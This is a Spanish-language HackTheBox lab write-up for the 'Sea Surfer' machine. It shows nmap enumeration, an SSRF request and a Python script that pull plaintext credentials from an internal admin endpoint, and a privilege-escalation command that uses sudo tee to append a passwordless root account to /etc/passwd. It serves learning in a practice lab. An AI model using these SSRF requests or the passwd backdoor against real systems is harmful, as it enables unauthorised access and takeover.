---
title: Sea Surfer
platform: HackTheBox
difficulty: medium
date: 2025-03-10
tags: web, ssrf, php
---

## Overview

**Sea Surfer** es una máquina de dificultad media en HackTheBox. El vector principal es un SSRF que permite pivotar hacia un servicio HTTP interno.

## Enumeración

```bash
nmap -sC -sV -oN nmap/sea_surfer 10.10.11.XX
```

Puertos abiertos:

| Puerto | Servicio | Versión      |
|--------|----------|--------------|
| 22     | SSH      | OpenSSH 8.9  |
| 80     | HTTP     | Apache 2.4.5 |

Visitando el puerto 80 aparece un formulario simple. Interceptamos con Burp.

## SSRF Discovery

El parámetro `url` se refleja sin sanitización:

```http
POST /fetch HTTP/1.1
Host: 10.10.11.XX

url=http://127.0.0.1:8080/admin
```

La respuesta filtra el panel de administración interno.

## Explotación

```python
import requests

TARGET   = "http://10.10.11.XX/fetch"
INTERNAL = "http://127.0.0.1:8080/admin/config"

r = requests.post(TARGET, data={"url": INTERNAL})
print(r.text)
```

El endpoint de config devuelve credenciales en texto plano.

## Root Flag

Después de SSH con las credenciales filtradas:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/tee
echo "eidd3::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su eidd3
```

`HTB{ssrf_t0_rc3_4_cl4ss1c}`
